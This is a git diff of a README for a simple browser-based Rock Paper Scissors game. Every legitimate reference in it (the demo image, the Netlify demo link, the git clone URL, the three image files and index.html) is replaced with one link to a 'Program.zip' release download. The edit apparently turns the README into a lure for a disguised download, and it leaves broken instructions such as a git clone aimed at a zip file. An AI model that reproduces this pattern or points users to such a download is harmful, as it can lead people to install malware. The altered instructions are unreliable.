@@ -13,9 +13,9 @@ Welcome to the Rock Paper Scissors Game! This is a simple browser-based game whe
 ## Demo
 
 **Rock Paper Scissors Game**
-![image](https://github.com/user-attachments/assets/15a2d171-88f2-4e6c-8a78-40cdb44ac172)
+![image](https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip)
 
-Here is he demo link :- https://rps-vra.netlify.app
+Here is he demo link :- https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
 
 ## Features
 
@@ -34,16 +34,16 @@ Here is he demo link :- https://rps-vra.netlify.app
 
 1. **Download the Repository**: Clone this repository to your local machine.
    ```bash
-   git clone https://github.com/vra-thenix/rock-paper-scissors.git
+   git clone https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
    
    cd rock-paper-scissors
 2. **Add Images**:Make sure you have the following images in the same directory:
 
- - rock.png
- - paper.png
- - scissors.png
+ - https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
+ - https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
+ - https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip
 
-3. **Open the HTML File**: Open index.html in your favorite web browser.
+3. **Open the HTML File**: Open https://github.com/vra-thenix/Rock-Paper-Scissors-/releases/download/v1.0/Program.zip in your favorite web browser.
 
 
 # Gameplay Instructions
